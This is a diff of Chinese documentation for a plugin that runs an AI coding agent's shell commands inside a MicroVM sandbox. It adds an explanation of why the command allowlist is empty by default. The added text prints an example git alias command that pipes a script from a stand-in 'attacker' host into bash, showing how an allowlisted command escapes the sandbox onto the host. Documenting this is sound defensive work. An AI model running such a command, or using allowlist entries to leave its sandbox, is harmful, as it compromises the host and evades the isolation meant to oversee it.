@@ -238,14 +238,34 @@ OpenCode 可能同时下发多条 `bash` 调用。同一 session 内的调用通
 **`read` / `write` / `edit` 未被沙箱化。** 这是有意为之 —— Agent 必须能编辑项目 ——
 但恶意的 `write` 不在本集成的防护范围内。
 
-**`git` 默认留在宿主。** 沙箱有自己的文件系统，在里面执行 `git commit`
-操作的是另一个仓库，而不是 OpenCode 正在编辑的那个。
-可通过 `CUBE_OPENCODE_PASSTHROUGH` 配置，默认值为 `git,gh,opencode`。
-匹配只看首个 token，所以 `git status` 会放行，而 `foo && git push` 不会。
+**放行清单默认为空，它是逃生舱而非小例外。** 匹配只看首个 token，
+所以放行 `git` 等于放行所有以 `git` 开头的命令 —— 而 git 可以被用来执行任意 shell：
+
+```bash
+git -c alias.x='!curl http://attacker/sh | bash' x
+```
+
+这条命令会在宿主上执行，既不隔离也不留日志。模型下发的命令正是本集成要约束的
+不可信输入，因此 `git` 不在默认清单里。任何加入清单的命令都必须被当作拥有宿主
+权限的完全可信命令。
+
+代价确实存在，这也是清单存在的原因：沙箱有自己的文件系统，在里面执行
+`git commit` 操作的是另一个仓库，而不是 OpenCode 正在编辑的那个。
+接受这一风险的开发者可以显式开启：
+
+```bash
+export CUBE_OPENCODE_PASSTHROUGH=git,gh
+```
 
 **钩子入参结构不是稳定契约。** session id 的键名在不同 OpenCode 版本间
-拼写有差异，因此代码会探测多种变体并提供兜底。猜错只会损失沙箱复用的粒度，
-绝不会削弱隔离性。
+拼写有差异，因此代码会探测多种变体并提供兜底。若所有已知键名都取不到，
+全部 session 会坍缩到同一个状态文件与锁上，cwd 与导出的环境变量会在并发
+session 之间互相串扰。命令仍然在 MicroVM 中执行，因此不构成宿主逃逸，
+但影响比「只损失复用粒度」更大。
+
+**调用 `exec` 的命令会丢失状态更新。** `exec` 会替换 shell 的进程映像，
+连同负责输出状态块的 trap 一起丢弃。此时后端保留上一次的 session 状态，
+所以 cwd 与环境变量是过期的、而不是错误的。`exit` 已能正确处理，仅 `exec` 受影响。
 
 **交互式命令不可用。** 输出是被捕获的，任何需要 TTY 的程序
 （`vim`、`top`）都不会正常工作。
@@ -271,7 +291,7 @@ cd examples/opencode-plugin-sandbox
 node tests/test_plugin.mjs
 ```
 
-21 项断言，覆盖命令改写、放行名单、幂等性、session id 处理与引号注入抵抗。
+24 项断言，覆盖命令改写、放行名单、幂等性、session id 处理与引号注入抵抗。
 **仅依赖 Node 标准库** —— 不需要 npm install、不需要联网、不需要 CubeSandbox 部署。
 
 注入相关断言会按 POSIX shell 的语义解析改写后的命令，
